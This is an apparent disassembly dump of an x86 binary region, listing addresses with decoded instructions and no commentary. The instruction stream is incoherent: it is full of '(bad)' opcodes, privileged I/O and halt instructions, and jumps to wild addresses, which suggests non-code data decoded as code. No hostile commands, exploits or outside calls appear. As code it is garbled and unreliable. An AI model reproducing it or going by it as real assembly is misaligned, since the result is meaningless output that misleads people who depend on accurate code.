  419eba:	inc    ecx
  419ebb:	mov    al,ds:0xe654269e
  419ec0:	and    DWORD PTR [edi],edi
	...
  419f32:	add    BYTE PTR [eax],al
  419f34:	sbb    al,0x97
  419f36:	in     al,0x47
  419f38:	out    dx,eax
  419f39:	ja     0x419efa
  419f3b:	fbstp  TBYTE PTR [ebx-0x3961f4b7]
  419f41:	mov    ch,0x23
  419f43:	stos   DWORD PTR es:[edi],eax
  419f44:	jo     0x419f5f
  419f46:	add    DWORD PTR [eax],eax
  419f48:	test   BYTE PTR [eax],0x0
  419f4b:	add    BYTE PTR [edi],bh
  419f4d:	adc    BYTE PTR [ebx],ch
  419f4f:	inc    edx
  419f50:	ja     0x419fad
  419f52:	leave  
  419f53:	push   ebp
  419f54:	cmp    BYTE PTR [ebx+eiz*8-0x6cce6750],dl
  419f5b:	mov    ebp,0x9e034afa
  419f60:	cmp    al,0x69
  419f62:	mov    esp,0x56ffaa10
  419f67:	inc    edx
  419f68:	pop    edx
  419f69:	rol    ah,cl
  419f6b:	and    DWORD PTR [ebp+ecx*1+0x22],esi
  419f6f:	jnp    0x419f4b
  419f71:	sbb    eax,0x6b7abc09
  419f76:	dec    edx
  419f77:	leave  
  419f78:	sbb    eax,0xc62236c5
  419f7d:	adc    eax,0xfd5c11a8
  419f82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f83:	dec    ecx
  419f84:	jbe    0x419fdf
  419f86:	jmp    0xfb44ae7f
  419f8b:	lahf   
  419f8c:	aas    
  419f8d:	ror    DWORD PTR [edi],1
  419f8f:	cdq    
  419f90:	mov    BYTE PTR ss:[edi],bh
  419f93:	mov    esp,0xb46c131a
  419f98:	bnd js 0x419f81
  419f9b:	xchg   bl,ch
  419f9d:	xchg   eax,ebp
  419f9f:	mov    ebx,0xe916da6f
  419fa4:	xchg   esp,eax
  419fa5:	(bad)  
  419fa7:	jg     0x41a027
  419fa9:	push   ds
  419faa:	mov    ds:0x262bc4b3,al
  419faf:	cmp    DWORD PTR [edx+0x53e73bd0],eax
  419fb5:	xchg   edx,eax
  419fb6:	xor    ebp,esp
  419fb8:	call   0x794b50cb
  419fbd:	adc    dl,BYTE PTR [ecx+0x4026d80b]
  419fc3:	and    al,0x22
  419fc5:	dec    esi
  419fc6:	ror    DWORD PTR [ebx],0x27
  419fc9:	ja     0x41a01d
  419fcb:	hlt    
  419fcc:	cs inc ebx
  419fce:	jns    0x41a005
  419fd0:	cli    
  419fd1:	xchg   esp,eax
  419fd2:	adc    DWORD PTR [edi-0x6c02a140],ebx
  419fd8:	inc    eax
  419fd9:	jb     0x419fe1
  419fdb:	icebp  
  419fdc:	(bad)  
  419fdd:	sbb    BYTE PTR [edi-0x34],cl
  419fe0:	enter  0x13e3,0x71
  419fe4:	pusha  
  419fe5:	mov    esp,0x7ea4ee66
  419fea:	outs   dx,DWORD PTR ds:[esi]
  419feb:	sahf   
  419fec:	clc    
  419fed:	int3   
  419fee:	push   ds
  419fef:	je     0x41a03a
  419ff1:	fimul  DWORD PTR [ebp-0x27]
  419ff4:	mov    esi,DWORD PTR [eax]
  419ff6:	pop    esp
  419ff7:	mov    edx,0x5761d89e
  419ffc:	and    BYTE PTR [esi+edx*2-0x5838e236],bh
  41a003:	sbb    BYTE PTR [edx-0x50],dh
  41a006:	sub    eax,0x6d913a5d
  41a00b:	inc    eax
  41a00c:	jecxz  0x41a003
  41a00e:	xchg   ecx,eax
  41a00f:	xchg   DWORD PTR [edx+0x790a945b],ecx
  41a015:	dec    ecx
  41a016:	mov    ds:0x55bbb4dd,eax
  41a01b:	pop    ds
  41a01c:	repz mov esp,DWORD PTR [ecx+0x77]
  41a020:	dec    esi
  41a021:	jbe    0x419fa5
  41a023:	rcl    DWORD PTR [edi-0x276ff9e7],cl
  41a029:	popf   
  41a02a:	out    dx,al
  41a02b:	jne    0x419fd4
  41a02d:	inc    esp
  41a02e:	jg     0x41a049
  41a030:	mov    cl,0x10
  41a032:	bound  eax,QWORD PTR [ebx+0x36]
  41a035:	xchg   esi,eax
  41a036:	mov    al,BYTE PTR [edi+0x1cdc86ec]
  41a03c:	ins    DWORD PTR es:[edi],dx
  41a03d:	or     BYTE PTR [esi-0x3a],al
  41a040:	arpl   WORD PTR [esi+0x0],sp
	...
  41a0b2:	add    BYTE PTR [eax],al
  41a0b4:	scas   eax,DWORD PTR es:[edi]
  41a0b5:	test   DWORD PTR [esi-0xa441be],ebx
  41a0bb:	in     eax,dx
  41a0bc:	(bad)  ds:0xbed004a2
  41a0c2:	xor    DWORD PTR [ecx+0x66],edi
  41a0c5:	sbb    al,BYTE PTR [ecx]
  41a0c7:	add    dh,dh
  41a0c9:	add    BYTE PTR [eax],al
  41a0cb:	add    bl,al
  41a0cd:	jnp    0x41a083
  41a0cf:	pop    edx
  41a0d0:	cmp    eax,0x5de574f2
  41a0d5:	ins    DWORD PTR es:[edi],dx
  41a0d6:	sub    al,0x9a
  41a0d8:	shl    DWORD PTR [eax-0x488b36e5],1
  41a0de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a0df:	sbb    BYTE PTR [edx],cl
  41a0e1:	out    0xa7,eax
  41a0e3:	repz (bad) 
  41a0e5:	ds push edi
  41a0e7:	sbb    dh,BYTE PTR [eax+0x73c3141a]
  41a0ed:	(bad)  
  41a0ef:	mov    al,0x76
  41a0f1:	mov    ch,0xac
  41a0f3:	xchg   BYTE PTR [esi-0x12],bl
  41a0f6:	add    BYTE PTR [edx+0x2],bl
  41a0f9:	jmp    0x644bb81
  41a0fe:	sbb    ah,BYTE PTR [ecx-0x1b]
  41a101:	and    eax,0x5ba0a572
  41a106:	cdq    
  41a107:	jg     0x41a0f7
  41a109:	fidivr DWORD PTR [esi-0x20]
  41a10c:	or     ebp,DWORD PTR [ecx]
  41a10e:	pop    esi
  41a10f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a110:	xchg   ebp,eax
  41a111:	sub    dl,BYTE PTR [esi+0x50]
  41a114:	jp     0x41a0d0
  41a116:	and    BYTE PTR [eax+0x75],0x5d
  41a11a:	pushf  
  41a11b:	nop
  41a11c:	dec    esi
  41a11d:	ins    BYTE PTR es:[edi],dx
  41a11e:	in     eax,dx
  41a11f:	dec    edx
  41a120:	js     0x41a174
  41a122:	stos   DWORD PTR es:[edi],eax
  41a123:	out    dx,al
  41a124:	(bad)  
  41a125:	adc    ecx,esp
  41a127:	inc    ecx
  41a128:	into   
  41a129:	push   esi
  41a12a:	ret    
  41a12b:	dec    ecx
  41a12c:	in     al,dx
  41a12d:	addr16 test eax,0xe4d1f8f0
  41a133:	pop    edx
  41a134:	adc    BYTE PTR [esi],bl
  41a136:	mov    WORD PTR [edx+0x5b],gs
  41a139:	xchg   edi,eax
  41a13a:	stc    
  41a13b:	dec    eax
  41a13c:	sar    DWORD PTR [esi+0x66887aa6],cl
  41a142:	rcl    BYTE PTR [edx],1
  41a144:	dec    ebx
  41a145:	inc    esp
  41a146:	and    eax,0x9eceb1dd
  41a14b:	js     0x41a0e3
  41a14d:	xor    esi,edi
  41a14f:	loope  0x41a0f6
  41a151:	ret    
  41a152:	push   ebp
  41a153:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a154:	and    al,0xf8
  41a156:	daa    
  41a157:	xor    al,0x7a
  41a159:	aas    
  41a15a:	jl     0x41a157
  41a15c:	xchg   edi,eax
  41a15d:	dec    ebx
  41a15e:	loop   0x41a163
  41a160:	mov    eax,0x4701c9ac
  41a165:	pop    ss
  41a166:	pop    edx
  41a167:	dec    eax
  41a168:	or     DWORD PTR [ecx+0x13],esi
  41a16b:	mov    eax,ss
  41a16d:	and    BYTE PTR [ecx-0x62],cl
  41a170:	push   es
  41a171:	jmp    0xd08bc4ea
  41a176:	je     0x41a18c
  41a178:	dec    esi
  41a179:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a17a:	push   esi
  41a17b:	addr16 (bad) 
  41a17d:	xchg   edi,eax
  41a17e:	inc    esi
  41a17f:	push   0x5d
  41a181:	loop   0x41a111
  41a183:	inc    ebx
  41a184:	mov    ebp,0xb6b6e07
  41a189:	dec    BYTE PTR [ecx-0x129a8c92]
  41a18f:	sbb    BYTE PTR [edx-0x60],ah
  41a192:	mov    dl,0x78
  41a194:	test   eax,0x72fcba3f
  41a199:	cld    
  41a19a:	adc    DWORD PTR [ebx],esi
  41a19c:	mov    bl,0x7b
  41a19e:	stc    
  41a19f:	je     0x41a170
  41a1a1:	push   ebp
  41a1a2:	nop
  41a1a3:	mov    edx,0x430b1e4f
  41a1a8:	nop
  41a1a9:	sbb    al,0x8
  41a1ab:	stos   DWORD PTR es:[edi],eax
  41a1ac:	loopne 0x41a1f7
  41a1ae:	dec    bl
  41a1b0:	addr16 add al,0xb7
  41a1b3:	xor    bh,BYTE PTR [edx-0x35a8ecd0]
  41a1b9:	bound  esp,QWORD PTR [eax-0xc]
  41a1bc:	in     eax,dx
  41a1bd:	cmp    bh,ch
  41a1bf:	leave  
  41a1c0:	cdq    
  41a1c1:	stos   DWORD PTR es:[edi],eax
	...
  41a232:	add    BYTE PTR [eax],al
  41a234:	mov    al,ds:0xff33bae7
  41a239:	jg     0x41a1e4
  41a23b:	imul   DWORD PTR [esi+eiz*4]
  41a23e:	push   edi
  41a23f:	imul   BYTE PTR [edi+0x46]
  41a242:	mov    dh,0xe1
  41a244:	pop    esp
  41a245:	sbb    eax,DWORD PTR [ecx]
  41a247:	add    dh,dh
  41a249:	add    BYTE PTR [eax],al
  41a24b:	add    BYTE PTR [esi-0x72f30e9a],bl
  41a251:	lds    ebp,FWORD PTR [ecx-0x7991286e]
  41a257:	push   edx
  41a258:	cmp    al,0xb0
  41a25a:	pop    ds
  41a25b:	nop
  41a25c:	adc    BYTE PTR [eax+0x52],ch
  41a25f:	mov    ecx,0xf8c41bf5
  41a264:	and    eax,0xb8f97127
  41a269:	mov    ah,0x8b
  41a26b:	jne    0x41a24e
  41a26d:	mul    DWORD PTR [edx+0x6c]
  41a270:	lea    edx,[ebp+0x360a619c]
  41a276:	daa    
  41a277:	cmp    eax,0x1bb1e1a9
  41a27c:	sti    
  41a27d:	(bad)  
  41a27e:	jecxz  0x41a2a9
  41a280:	jmp    0x41a279
  41a282:	jmp    0xfbf0:0xfd4f66ca
  41a289:	sub    DWORD PTR [edi],esi
  41a28b:	push   ds
  41a28c:	xor    eax,edx
  41a28e:	xlat   BYTE PTR ds:[ebx]
  41a28f:	mov    eax,ds:0xa313a89e
  41a294:	pop    edi
  41a295:	add    dh,ah
  41a297:	jae    0x41a2b5
  41a299:	or     DWORD PTR [esp+ebx*8+0x63b7c361],0x4d5856d3
  41a2a4:	lea    ebp,[ebp-0x23]
  41a2a7:	aam    0xd2
  41a2a9:	inc    edx
  41a2aa:	lods   al,BYTE PTR ds:[esi]
  41a2ab:	leave  
  41a2ac:	jne    0x41a2ec
  41a2ae:	(bad)  
  41a2af:	pop    ds
  41a2b0:	unpckhps xmm4,XMMWORD PTR [ebp-0x1ac976e7]
  41a2b7:	mov    ds:0xc8119b85,eax
  41a2bc:	aas    
  41a2bd:	out    0xe1,al
  41a2bf:	pop    eax
  41a2c0:	(bad)  
  41a2c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a2c2:	test   al,0x18
  41a2c4:	push   ds
  41a2c5:	cdq    
  41a2c6:	mov    ah,0x23
  41a2c8:	and    cl,cl
  41a2ca:	(bad)  
  41a2cb:	jle    0x41a2f6
  41a2cd:	sub    eax,0x555e2a4a
  41a2d2:	mov    ebp,DWORD PTR [edx]
  41a2d4:	jnp    0x41a2d4
  41a2d6:	ficom  WORD PTR [eax-0xb]
  41a2d9:	mov    esi,0x4160c832
  41a2de:	pop    esp
  41a2df:	(bad)
  41a2e2:	or     BYTE PTR [edx],bl
  41a2e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a2e5:	(bad)  
  41a2e6:	cld    
  41a2e7:	loopne 0x41a2bf
  41a2e9:	dec    ebp
  41a2ea:	xor    BYTE PTR [edx],ah
  41a2ec:	mov    BYTE PTR [eax-0x2f1ca841],bh
  41a2f2:	xchg   DWORD PTR [ebx+0x1e],edx
  41a2f5:	test   eax,0x76bf4ae6
  41a2fa:	scas   al,BYTE PTR es:[edi]
  41a2fb:	ja     0x41a31c
  41a2fd:	sbb    BYTE PTR [edi-0x48],ch
  41a300:	cmp    esi,esp
  41a302:	out    dx,eax
  41a303:	loopne 0x41a28e
  41a305:	aas    
  41a306:	mov    edx,0x676980b4
  41a30b:	push   ecx
  41a30c:	xor    dh,BYTE PTR [ebp-0x62bec5e0]
  41a312:	mov    esp,0xe5ba948b
  41a317:	mov    bl,0x2b
  41a319:	inc    edi
  41a31a:	and    edi,DWORD PTR [eax]
  41a31c:	retf   0xda1e
  41a31f:	xor    eax,0x6f24bcaf
  41a324:	in     eax,0x15
  41a326:	je     0x41a320
  41a328:	and    eax,0xcfecbbbc
  41a32d:	pop    edx
  41a32e:	add    BYTE PTR [eax+0x3d329b22],ch
  41a334:	sar    BYTE PTR [ebx+0x4fb425a8],1
  41a33a:	cpuid  
  41a33c:	pop    esi
  41a33d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a33e:	div    DWORD PTR [ebx+0x5]
  41a341:	out    dx,al
	...
  41a3b2:	add    BYTE PTR [eax],al
  41a3b4:	cmp    eax,0xed3a6998
  41a3b9:	sti    
  41a3ba:	jg     0x41a35b
  41a3bc:	and    DWORD PTR [esi+edx*4+0x6a],ebp
  41a3c0:	inc    esp
  41a3c1:	es arpl dx,sp
  41a3c4:	push   edx
  41a3c5:	sbb    al,0x1
  41a3c7:	add    dh,dh
  41a3c9:	add    BYTE PTR [eax],al
  41a3cb:	add    BYTE PTR [edx+0x7a],cl
  41a3ce:	lods   al,BYTE PTR ds:[esi]
  41a3cf:	add    BYTE PTR [ecx+0x47],0xd
  41a3d3:	jne    0x41a3d6
  41a3d5:	sub    DWORD PTR [edx+ecx*4],esi
  41a3d8:	jmp    0xfb2:0x28720604
  41a3df:	outs   dx,BYTE PTR ds:[esi]
  41a3e0:	mov    dh,0xf4
  41a3e2:	out    0xbd,al
  41a3e4:	(bad)  
  41a3e6:	mov    ds:0x7936cbbd,eax
  41a3eb:	pop    ebx
  41a3ec:	shl    BYTE PTR [edx-0x42],0x44
  41a3f0:	loope  0x41a380
  41a3f2:	xchg   ebp,eax
  41a3f3:	mov    bh,0xb8
  41a3f5:	mov    bh,0xdf
  41a3f7:	sub    bh,al
  41a3f9:	jp     0x41a3a6
  41a3fb:	mov    esi,0x25721243
  41a400:	outs   dx,DWORD PTR ds:[esi]
  41a401:	test   eax,0x5daaa167
  41a406:	pop    ss
  41a407:	cmp    al,0xe6
  41a409:	sbb    al,0xad
  41a40b:	push   ebp
  41a40c:	mov    bl,0xaf
  41a40e:	fcom   DWORD PTR [ebp+0xaceff9b]
  41a414:	lods   al,BYTE PTR ds:[esi]
  41a415:	jae    0x41a46b
  41a417:	pop    esi
  41a418:	xlat   BYTE PTR ds:[ebx]
  41a419:	pop    ecx
  41a41a:	rol    esp,cl
  41a41c:	sub    eax,0xa0d266da
  41a421:	or     DWORD PTR [ecx+0x4f3cd790],edi
  41a427:	nop
  41a428:	push   es
  41a429:	xor    eax,DWORD PTR [ebp-0x5b]
  41a42c:	or     eax,0x12b7b3d4
  41a431:	dec    esp
  41a432:	call   0x20e7:0x21bea4b0
  41a439:	sbb    DWORD PTR [esi+ecx*2+0x2fe34a4a],edi
  41a440:	push   eax
  41a441:	pop    edx
  41a442:	dec    edx
  41a443:	out    dx,al
  41a444:	int    0xee
  41a446:	nop
  41a447:	sbb    eax,0x36a8f973
  41a44c:	pop    edx
  41a44d:	mov    ds:0x1e673b33,eax
  41a452:	sbb    al,0xf1
  41a454:	sahf   
  41a455:	add    bl,BYTE PTR [ecx+0x3d]
  41a458:	imul   esp,DWORD PTR [ecx],0x6dd27646
  41a45e:	gs xor bl,ch
  41a461:	or     eax,0x8e1cf121
  41a466:	jmp    0x41a416
  41a468:	mov    dh,0x57
  41a46a:	add    eax,0xe3b192a9
  41a46f:	and    eax,0x39cada65
  41a474:	lock retf 
  41a476:	push   edi
  41a477:	and    BYTE PTR [ebp+0x618fa67e],ah
  41a47d:	mov    DWORD PTR [esi+ecx*2-0x2c],edx
  41a481:	dec    ebx
  41a483:	pop    es
  41a484:	stos   DWORD PTR es:[edi],eax
  41a485:	lock sar BYTE PTR [ecx+0x19],cl
  41a489:	or     esp,0xee536b2e
  41a48f:	mov    ss,edx
  41a491:	fs mov esi,0x9b3d8b33
  41a497:	retf   0xfa4b
  41a49a:	jno    0x41a503
  41a49c:	inc    ebp
  41a49d:	scas   al,BYTE PTR es:[edi]
  41a49e:	jp     0x41a4ab
  41a4a0:	dec    eax
  41a4a1:	mov    ebx,0x70b4bf58
  41a4a6:	in     eax,dx
  41a4a7:	sbb    bl,BYTE PTR [ebp+0x142eb949]
  41a4ad:	xchg   edx,eax
  41a4ae:	cwde   
  41a4af:	push   0xffffff85
  41a4b1:	mov    BYTE PTR [ebp-0x8],ch
  41a4b4:	or     ch,cl
  41a4b6:	dec    esp
  41a4b7:	fwait
  41a4b8:	inc    ebp
  41a4b9:	mov    edx,0xc3267cc7
  41a4be:	xor    al,0x60
  41a4c0:	loop   0x41a4b2
	...
  41a532:	add    BYTE PTR [eax],al
  41a534:	scas   eax,DWORD PTR es:[edi]
  41a535:	aam    0x8d
  41a537:	(bad)  
  41a538:	(bad)  
  41a539:	jnp    0x41a52a
  41a53b:	fld    QWORD PTR [eax+0x46e9e0aa]
  41a541:	mov    dh,0x96
  41a543:	scas   al,BYTE PTR es:[edi]
  41a544:	dec    eax
  41a545:	sbb    eax,0xf60001
  41a54a:	add    BYTE PTR [eax],al
  41a54c:	lods   al,BYTE PTR ds:[esi]
  41a54d:	lds    ebp,FWORD PTR [ecx+esi*8+0x63875729]
  41a554:	les    eax,FWORD PTR [esi-0x2f]
  41a557:	int3   
  41a558:	js     0x41a50d
  41a55a:	push   ecx
  41a55b:	xchg   ecx,eax
  41a55c:	adc    BYTE PTR [ebx+0x2433bf5],0x8c
  41a563:	xor    dl,dh
  41a565:	mov    bl,0x65
  41a567:	mov    bl,BYTE PTR gs:[ecx-0x1e]
  41a56b:	sbb    ebp,edx
  41a56d:	dec    edi
  41a56e:	cwde   
  41a56f:	lds    edx,FWORD PTR [edx+eax*4-0x6c744dc0]
  41a576:	pop    eax
  41a577:	out    0x69,al
  41a579:	and    DWORD PTR [eax+0x37],0xffffffcb
  41a57d:	xchg   edx,eax
  41a57e:	sbb    al,0xf1
  41a580:	ret    
  41a581:	mov    ds:0x2c512109,al
  41a586:	xor    BYTE PTR [esi+0x7d],al
  41a589:	arpl   WORD PTR [esi-0x5],ax
  41a58c:	mov    dh,0xb5
  41a58e:	jmp    0x41a5e5
  41a590:	mov    ebx,esi
  41a592:	cmp    bh,BYTE PTR [ebp+0x14979c79]
  41a598:	cmp    edx,DWORD PTR [edx]
  41a59a:	jmp    0x41a540
  41a59c:	dec    edx
  41a59d:	sbb    cl,BYTE PTR [eax]
  41a59f:	pop    edx
  41a5a0:	ins    DWORD PTR es:[edi],dx
  41a5a1:	mov    WORD PTR [ecx-0x5000dcb7],ds
  41a5a7:	push   ecx
  41a5a8:	pop    edi
  41a5a9:	pushf  
  41a5aa:	xchg   edi,eax
  41a5ab:	add    ecx,DWORD PTR [ebp-0x36]
  41a5ae:	fwait
  41a5af:	enter  0x6a6e,0x5
  41a5b3:	xlat   BYTE PTR ds:[ebx]
  41a5b4:	ror    BYTE PTR [ebx+0x53],0x88
  41a5b8:	scas   eax,DWORD PTR es:[edi]
  41a5b9:	cmp    esp,ecx
  41a5bb:	xchg   ebp,eax
  41a5bc:	iret   
  41a5bd:	scas   al,BYTE PTR es:[edi]
  41a5be:	leave  
  41a5bf:	inc    eax
  41a5c0:	push   esp
  41a5c1:	sub    al,0x2
  41a5c3:	jbe    0x41a589
  41a5c5:	enter  0x289f,0xb1
  41a5c9:	xchg   sp,ax
  41a5cb:	and    edi,esi
  41a5cd:	jecxz  0x41a61f
  41a5cf:	out    0x47,al
  41a5d1:	outs   dx,DWORD PTR ds:[esi]
  41a5d2:	lods   eax,DWORD PTR ds:[esi]
  41a5d3:	pop    ebp
  41a5d4:	sub    BYTE PTR [eax-0x79217e29],bh
  41a5da:	cdq    
  41a5db:	xor    BYTE PTR [esi-0x5183d70],cl
  41a5e1:	push   ecx
  41a5e2:	stc    
  41a5e3:	cmc    
  41a5e4:	jnp    0x41a615
  41a5e6:	xchg   DWORD PTR [ebx-0x14],esp
  41a5e9:	xchg   ecx,eax
  41a5ea:	adc    dl,bl
  41a5ec:	xchg   BYTE PTR [eax-0x53],bh
  41a5ef:	and    al,0x7e
  41a5f1:	xor    BYTE PTR [ecx],al
  41a5f3:	add    al,0x4a
  41a5f5:	or     cl,bl
  41a5f7:	xor    DWORD PTR ds:0x12194918,esp
  41a5fd:	cmp    eax,0xaaf6fd63
  41a602:	mov    esp,0x390a6e57
  41a607:	inc    ebp
  41a608:	push   ecx
  41a609:	lahf   
  41a60a:	xor    eax,0x57188db1
  41a60f:	push   eax
  41a610:	and    eax,0xb1898ca9
  41a615:	lea    edi,[ecx+esi*4+0x10]
  41a619:	xchg   DWORD PTR [esi+0x15],esi
  41a61c:	mov    al,0x64
  41a61e:	pop    ebp
  41a61f:	pop    ds
  41a620:	jb     0x41a699
  41a622:	mov    bh,0x2d
  41a624:	mov    ch,dl
  41a626:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a627:	ins    DWORD PTR es:[edi],dx
  41a628:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a629:	mov    esi,0x36604c2d
  41a62e:	lods   al,BYTE PTR ds:[esi]
  41a62f:	xchg   esp,eax
  41a630:	mov    al,dl
  41a632:	ss cmp bl,ch
  41a635:	popa   
  41a636:	rol    dh,1
  41a638:	mov    BYTE PTR [ebp+0x3edfc85c],ah
  41a63e:	and    BYTE PTR [ebp-0x1f],dl
  41a641:	xchg   edx,eax
	...
  41a6b2:	add    BYTE PTR [eax],al
  41a6b4:	mov    bl,0x3f
  41a6b6:	jno    0x41a71d
  41a6b8:	std    
  41a6b9:	outs   dx,DWORD PTR ds:[esi]
  41a6ba:	mov    bh,0xff
  41a6bc:	xchg   ecx,eax
  41a6bd:	pop    edx
  41a6be:	cdq    
  41a6bf:	mov    dl,0x1b
  41a6c1:	xor    ch,dh
  41a6c3:	mov    ah,0x3e
  41a6c5:	push   ds
  41a6c6:	add    DWORD PTR [eax],eax
  41a6c8:	test   BYTE PTR [eax],0x0
  41a6cb:	add    BYTE PTR [eax+0xb],bl
  41a6ce:	out    0xc8,eax
  41a6d0:	les    ecx,FWORD PTR [ebx]
  41a6d2:	jne    0x41a708
  41a6d4:	out    0xe6,eax
  41a6d6:	inc    di
  41a6d8:	adc    al,BYTE PTR [ebx+0x7]
  41a6db:	leave  
  41a6dc:	sbb    al,0xa2
  41a6de:	jno    0x41a69e
  41a6e0:	sub    al,0x9e
  41a6e2:	sub    dl,ch
  41a6e4:	add    al,0x2
  41a6e6:	mov    al,ds:0x17905e58
  41a6eb:	push   edx
  41a6ec:	popa   
  41a6ed:	shl    bl,cl
  41a6ef:	test   eax,0x28b9ea18
  41a6f4:	imul   ebp,ecx,0x4f25d871
  41a6fa:	shl    BYTE PTR [ecx+0x301830f],cl
  41a700:	jno    0x41a6fa
  41a702:	jl     0x41a720
  41a704:	in     al,dx
  41a705:	jmp    0x41a785
  41a707:	sar    DWORD PTR [edx],0x95
  41a70a:	(bad)  
  41a70b:	(bad)  
  41a70c:	iret   
  41a70d:	dec    BYTE PTR ds:0xfa7b08a8
  41a713:	(bad)  
  41a714:	jmp    0x7504:0x71d0025f
  41a71b:	sti    
  41a71c:	nop
  41a71d:	and    BYTE PTR [bx+di-0x558c],dh
  41a722:	mov    ah,0x8f
  41a724:	(bad)  
  41a725:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a726:	inc    eax
  41a727:	mov    ah,dh
  41a729:	dec    eax
  41a72a:	sbb    ebx,ebp
  41a72c:	sbb    al,0x19
  41a72e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a72f:	push   0x25758a1b
  41a734:	cmc    
  41a735:	or     cl,bl
  41a737:	fnstenv [ebx-0x16dacec9]
  41a73d:	and    ah,ah
  41a73f:	dec    ebp
  41a740:	addr16 inc ebx
  41a742:	push   ebx
  41a743:	pop    edx
  41a744:	mov    dl,0xf9
  41a746:	mov    WORD PTR [ecx-0x3be5771c],cs
  41a74c:	mov    al,ds:0xddd15fbf
  41a751:	sbb    esi,ebp
  41a753:	fild   WORD PTR [edx+eiz*2]
  41a756:	psrlq  mm4,QWORD PTR [ecx]
  41a759:	mov    ebx,0x6864aa96
  41a75e:	sbb    edi,ebp
  41a760:	mov    BYTE PTR [ebx],bl
  41a762:	push   ebp
  41a763:	and    al,0xda
  41a765:	jnp    0x41a769
  41a767:	push   edi
  41a768:	pop    edx
  41a769:	mov    bh,0xfd
  41a76b:	mov    edx,0xc3a99d8f
  41a770:	outs   dx,DWORD PTR ds:[esi]
  41a771:	mov    cl,0xcc
  41a773:	pop    ds
  41a774:	jecxz  0x41a796
  41a776:	fcmovu st,st(5)
  41a778:	or     al,0x7b
  41a77a:	sub    al,0x6f
  41a77c:	arpl   di,cx
  41a77e:	scas   al,BYTE PTR es:[edi]
  41a77f:	dec    edi
  41a780:	(bad)
  41a783:	cli    
  41a784:	scas   al,BYTE PTR es:[edi]
  41a785:	dec    ebx
  41a786:	jne    0x41a7b8
  41a788:	stos   DWORD PTR es:[edi],eax
  41a789:	pop    ebp
  41a78a:	fwait
  41a78b:	xchg   edi,eax
  41a78c:	(bad)  
  41a78d:	push   ecx
  41a78e:	out    0x36,al
  41a790:	nop
  41a791:	mov    DWORD PTR ss:[eax-0x68],edi
  41a795:	and    esi,ecx
  41a797:	out    dx,eax
  41a798:	and    edi,DWORD PTR [ebp-0x74]
  41a79b:	mov    ebp,DWORD PTR [esi+ebx*1-0x2658f1d3]
  41a7a2:	or     al,ch
  41a7a4:	xlat   BYTE PTR ds:[ebx]
  41a7a5:	mov    dl,0x1
  41a7a7:	les    edx,FWORD PTR [eax]
  41a7a9:	and    al,0x86
  41a7ab:	lods   eax,DWORD PTR ds:[esi]
  41a7ac:	jl     0x41a738
  41a7ae:	push   esp
  41a7af:	pusha  
  41a7b0:	mov    al,ds:0xdce7b032
  41a7b5:	pop    esi
  41a7b6:	push   es
  41a7b7:	jge    0x41a76f
  41a7b9:	std    
  41a7ba:	xor    BYTE PTR [ebx],ah
  41a7bc:	mov    dh,bl
  41a7be:	mov    dh,0x74
  41a7c0:	shl    DWORD PTR [eax+0x0],0x0
	...
  41a834:	sbb    BYTE PTR [ecx],0x47
  41a837:	loope  0x41a818
  41a839:	jmp    DWORD PTR [esi-0xf626c85]
  41a83f:	loop   0x41a814
  41a841:	clc    
  41a842:	mov    DWORD PTR [edi+0x34],ecx
  41a845:	pop    ds
  41a846:	add    DWORD PTR [eax],eax
  41a848:	test   BYTE PTR [eax],0x0
  41a84b:	add    BYTE PTR [ebx-0x76],al
  41a84e:	enter  0xde33,0x2f
  41a852:	add    ah,BYTE PTR [ecx]
  41a854:	enter  0xcf1a,0x69
  41a858:	mov    esi,0x7144e45a
  41a85d:	or     ah,bl
  41a85f:	out    0x6e,eax
  41a861:	rol    BYTE PTR [esi+0x62e6d0c6],cl
  41a867:	sti    
  41a868:	not    BYTE PTR [edi]
  41a86a:	sub    DWORD PTR [ebx+0x5c],edx
  41a86d:	cwde   
  41a86e:	jmp    0x41a8cd
  41a870:	(bad)  
  41a871:	hlt    
  41a872:	cmp    eax,0xebf541a4
  41a877:	aaa    
  41a878:	add    bh,al
  41a87a:	clc    
  41a87b:	jmp    0x1f70:0x98db31cc
  41a882:	sub    al,0x93
  41a884:	stc    
  41a885:	push   ebx
  41a886:	pop    ds
  41a887:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a888:	fist   DWORD PTR [eax+0x12d5459]
  41a88e:	adc    DWORD PTR [edx-0x59],edi
  41a891:	ss maxps xmm1,xmm5
  41a895:	mov    eax,0xe02e7f7d
  41a89a:	fsincos 
  41a89c:	aad    0x84
  41a89e:	das    
  41a89f:	int3   
  41a8a0:	jge    0x41a832
  41a8a2:	bound  ebx,QWORD PTR [eax-0x17]
  41a8a5:	mov    dh,0x11
  41a8a7:	or     dh,BYTE PTR [esi-0x3b]
  41a8aa:	xchg   ebx,eax
  41a8ab:	iret   
  41a8ac:	cmc    
  41a8ad:	dec    ecx
  41a8ae:	sbb    bl,0x6b
  41a8b1:	pop    esp
  41a8b2:	popf   
  41a8b3:	(bad)  
  41a8b4:	push   edx
  41a8b5:	add    al,0x3a
  41a8b7:	fadd   QWORD PTR [edi-0x1de93493]
  41a8bd:	mov    ah,0x3e
  41a8bf:	ins    BYTE PTR es:[edi],dx
  41a8c0:	pusha  
  41a8c1:	and    al,0x36
  41a8c3:	jp     0x41a8d0
  41a8c5:	push   ecx
  41a8c6:	jp     0x41a920
  41a8c8:	jne    0x41a89e
  41a8ca:	inc    ecx
  41a8cb:	push   edi
  41a8cc:	mov    ds:0xe2da5828,eax
  41a8d1:	fidivr DWORD PTR [edx+0x21bdf693]
  41a8d7:	pop    ebx
  41a8d8:	push   esp
  41a8d9:	mov    bl,0xd3
  41a8db:	or     BYTE PTR [eax-0xb],dl
  41a8de:	pop    ebp
  41a8df:	push   ebp
  41a8e0:	mov    ds:0x5f5990fe,al
  41a8e5:	das    
